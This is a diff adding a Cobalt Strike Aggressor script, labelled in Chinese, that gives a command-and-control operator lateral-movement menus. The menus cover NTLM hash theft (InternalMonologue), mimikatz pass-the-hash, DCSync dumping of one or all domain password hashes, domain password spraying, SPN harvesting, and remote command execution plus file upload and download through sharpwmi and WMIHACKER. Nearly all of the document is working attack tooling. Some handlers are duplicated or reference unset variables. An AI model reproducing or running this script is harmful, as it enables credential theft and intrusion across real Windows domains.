@@ -1,0 +1,277 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       Xway.cn@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+	menu "横向移动" {
+    	item "NTLM hash"{
+    		local('$bid');
+               foreach $bid ($1){
+                   internal_monologue($bid);
+            }
+    	}
+sub internal_monologue{
+	$binary = script_resource("/script/InternalMonologue.exe");
+	$help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
+	beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
+	if(!-exists $binary)
+	{
+		berror($1, "InternalMonologue binary cannot be found at $binary");
+		return;
+	}
+	$args = "-Downgrade True -Verbose True";
+	bexecute_assembly($1, $binary, $args);
+}	
+
+			item "探测多网卡主机" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpOXID-Find", %(ip => "192.168.1.1/24",bid => $bid), &SharpOXID-Find);
+			dialog_description($dialog, "OXID 解析器，用于探测多网口机器（依赖于 135 端口）,-i扫描指定ip,-c扫描C段。");
+			drow_combobox($dialog, "type", "type:", @("-i","-c"));
+			drow_text($dialog, "ip", "ip:  ");			
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpOXID-Find {
+	$arg = join(' ',  @($3['type'],$3['ip']));
+	bexecute_assembly($bid, script_resource("/script/SharpOXID-Find.exe"), $arg);
+}	
+		
+		item "SharpHound3.0" {
+			bexecute_assembly($1, script_resource("/script/SharpHound.exe"), "");
+		}
+
+
+    	item "Mimikatz-pth"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_passthehash($bid);
+            }
+    	}
+
+
+sub mimikatz_passthehash{
+	$bid = $1;
+	$dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "GLITTER" , user => "administrator" , hash => "hash") , 
+	lambda({
+		bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]);
+	}
+	)
+	);
+	dialog_description($dialog, "Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz.");
+	drow_text($dialog, "beacon",  "Beacon:");
+	drow_text($dialog, "domain",  "Domain:");
+	drow_text($dialog, "user",  "User:");
+	drow_text($dialog, "hash",  "Hash:");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);
+}
+
+	    menu "sharpwmi" {
+			item "上传sharpwmi" {
+				$bid = $1;
+				$dialog = dialog("上传sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub sharpwmi_up {
+
+    bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/script/sharpwmi.exe"));
+    
+
+}
+                item "运行sharpwmi"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("运行sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
+                    dialog_description($Dialog, "这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能，通过wmi来执行命令，通过调用来进行数据传输,目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。");
+                    drow_text($Dialog, "ip", "ip: ");
+					drow_text($Dialog, "username", "username: ");
+					drow_text($Dialog, "password", "password: ");
+					drow_text($Dialog, "type", "cmd/upload: ");
+					drow_text($Dialog, "cmd/path", "cmd/path: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+
+sub sharpwmi_run{
+    local('$Name $username $password $type $cmd/path');
+    $Name = $3['ip'];
+	$username = $3['username'];
+	$password = $3['password'];
+	$type = $3['type'];
+	$cmd/path = $3['cmd/path'];
+	bshell($bid, "sharpwmi.exe  $+ $Name  $+ $port  $+ $username  $+ $password  $+ $type  $+ $cmd/path");
+} 
+        	item "删除sharpwmi"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q sharpwmi.exe");
+        	}
+		}
+}
+
+	    menu "WMIHACKER" {
+			item "上传WMIHACKER" {
+				$bid = $1;
+				$dialog = dialog("上传WMIHACKER", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &WMIHACKER);
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub WMIHACKER {
+
+    bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/script/WMIHACKER.vbs"));
+    
+
+}
+            item "cmd"{
+                $bid = $1['@'];
+                $Dialog = dialog("WMIHACKER_cmd",%(host => "127.0.0.1", user => "administrator", pass => "password", command => "systeminfo", GETRES => "1 or 0",bid => $bid),&WMIHACKER_cmd);
+                dialog_description($Dialog, "");
+                drow_text($Dialog, "host", "host: ");
+				drow_text($Dialog, "user", "user: ");
+				drow_text($Dialog, "pass", "pass: ");
+				drow_text($Dialog, "command", "command: ");
+				drow_text($Dialog, "GETRES", "GETRES: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+                }
+sub WMIHACKER_cmd{
+    local('$host $user $pass $command $GETRES');
+    $host = $3['host'];
+	$user = $3['user'];
+	$pass = $3['pass'];
+	$command = $3['command'];
+	$GETRES = $3['GETRES'];
+	bshell($bid, "cscript WMIHACKER.vbs /cmd  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$command\"  $+ $GETRES");
+} 
+
+            item "shell"{
+                $bid = $1['@'];
+                $Dialog = dialog("WMIHACKER_shell",%(host => "127.0.0.1", user => "administrator", pass => "password", command => "systeminfo", GETRES => "1 or 0",bid => $bid),&WMIHACKER_cmd);
+                dialog_description($Dialog, "");
+                drow_text($Dialog, "host", "host: ");
+				drow_text($Dialog, "user", "user: ");
+				drow_text($Dialog, "pass", "pass: ");
+				drow_text($Dialog, "command", "command: ");
+				drow_text($Dialog, "GETRES", "GETRES: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+                }
+sub WMIHACKER_cmd{
+    local('$host $user $pass $command $GETRES');
+    $host = $3['host'];
+	$user = $3['user'];
+	$pass = $3['pass'];
+	$command = $3['command'];
+	$GETRES = $3['GETRES'];
+	bshell($bid, "cscript WMIHACKER.vbs /cmd  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$command\"  $+ $GETRES");
+}
+
+            item "upload"{
+                $bid = $1['@'];
+                $Dialog = dialog("WMIHACKER_upload",%(host => "127.0.0.1", user => "administrator", pass => "password", localpath => "c:\\windows\\system32\\calc.exe", remotepath => "C:\\\$Recycle.Bin",bid => $bid),&WMIHACKER_upload);
+                dialog_description($Dialog, "");
+                drow_text($Dialog, "host", "host: ");
+				drow_text($Dialog, "user", "user: ");
+				drow_text($Dialog, "pass", "pass: ");
+				drow_text($Dialog, "localpath", "localpath: ");
+				drow_text($Dialog, "remotepath", "remotepath: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+                }
+sub WMIHACKER_upload{
+    local('$host $user $pass $localpath $remotepath');
+    $host = $3['host'];
+	$user = $3['user'];
+	$pass = $3['pass'];
+	$localpath = $3['localpath'];
+	$remotepath = $3['remotepath'];
+	bshell($bid, "cscript WMIHACKER.vbs /upload  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$localpath\"  $+ \"$remotepath\"");
+} 
+
+            item "download"{
+                $bid = $1['@'];
+                $Dialog = dialog("WMIHACKER_download",%(host => "127.0.0.1", user => "administrator", pass => "password", localpath => "c:\\calc", remotepath => "c:\\windows\\system32\\calc.exe",bid => $bid),&WMIHACKER_download);
+                dialog_description($Dialog, "");
+                drow_text($Dialog, "host", "host: ");
+				drow_text($Dialog, "user", "user: ");
+				drow_text($Dialog, "pass", "pass: ");
+				drow_text($Dialog, "localpath", "localpath: ");
+				drow_text($Dialog, "remotepath", "remotepath: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+                }
+sub WMIHACKER_download{
+    local('$host $user $pass $localpath $remotepath');
+    $host = $3['host'];
+	$user = $3['user'];
+	$pass = $3['pass'];
+	$localpath = $3['localpath'];
+	$remotepath = $3['remotepath'];
+	bshell($bid, "cscript WMIHACKER.vbs /download  $+ $host  $+ $user  $+ \"$pass\"  $+ \"$localpath\"  $+ \"$remotepath\"");
+} 
+
+
+
+		}
+			item "枚举域用户密码" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpDomainSpray", %(content => "",bid => $bid), &SharpDomainSpray);
+			dialog_description($dialog, "枚举域内用户密码（Pass2User指定单个密码-枚举，User2Pass指定单个用户-爆破）。");
+			drow_text($dialog, "content", "content:  ");		
+			drow_combobox($dialog, "type", "type", @("-User2Pass", "-Pass2User"));
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpDomainSpray {
+	$arg = join(' ', @($3['type'],$3['content']));
+	bexecute_assembly($bid, script_resource("/script/SharpDomainSpray/SharpDomainSpray.exe"), $arg);
+} 
+
+		item "获取SPN" {
+			bexecute_assembly($1, script_resource("/script/SPNSearcher.exe"), "");
+		}
+
+		 menu "获取域用户hash" {
+		 		item "指定用户" {
+		 			$dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "域名" , user => "用户") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
+		 			dialog_description($dialog,"使用Mimikatz去获取指定用户的密码Hash");
+		 			drow_text($dialog,"bid","Bid:");
+		 			drow_text($dialog,"domain","Domain:");
+		 			drow_text($dialog,"user","User:");
+		 			dbutton_action($dialog,"Exploit");
+		 			dialog_show($dialog);
+ 		 		}
+		 		item "全部用户" {
+		 			$dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "域名") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
+		 			dialog_description($dialog, "获取全部用户的密码Hash");
+		 			drow_text($dialog, "domain","Domain:");
+		 			dbutton_action($dialog,"Exploit");
+		 			dialog_show($dialog);
+
+		 		}
+		 }
+
+			item "获取域共享" {
+			$bid = $1['@'];
+			$dialog = dialog("获取域共享", %(bid => $bid), &SharpShares);
+			dialog_description($dialog, "列出当前域中所有计算机的网络共享信息,也可以将所有计算机名称转换为IP地址。");
+			drow_combobox($dialog, "type", "type:", @("ips","shares"));		
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpShares {
+	$arg = join(' ',  @($3['type']));
+	bexecute_assembly($bid, script_resource("/script/SharpShares.exe"), $arg);
+}
+		
+		
+		}
